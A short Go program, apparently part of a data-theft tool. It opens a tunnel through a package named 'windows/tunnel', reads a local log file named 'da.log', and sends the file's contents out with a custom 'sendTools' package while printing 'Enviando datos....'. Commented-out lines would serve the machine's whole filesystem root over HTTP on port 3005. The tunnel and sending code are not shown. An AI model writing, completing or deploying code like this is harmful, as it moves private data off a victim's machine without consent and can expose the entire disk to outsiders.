package main

import (
	"fmt"
	"os"
	//"net/http"
	"windows/sendTools"
	"windows/tunnel"
)


func main(){
	fmt.Println("ASJDLAJSLDJALKSDJLAKJSDLKASJDLKJALSDAKDLA")

	
	 re := tunnel.InitTunne()
	 fmt.Println(re)
	 if(re){
	 	dat, err := os.ReadFile("da.log")
		if(err != nil){
			fmt.Println(err)
		}
		fmt.Println(string(dat))
		sendTools.Send("Enviando datos....")
		re := sendTools.Send(string(dat))
		fmt.Println(re)
		
	 }else{
		fmt.Println("Error")
	 }
	

	//fmt.Println(tunnel.Command("linux", "hel"))
	// resp := http.FileServer(http.Dir("/"))

	// http.Handle("/", resp)

	// fmt.Println("iNICIANDO SERVER")
	// err := http.ListenAndServe(":3005", nil)
	// if(err != nil){
	// 	fmt.Println(err)
	// }
	

}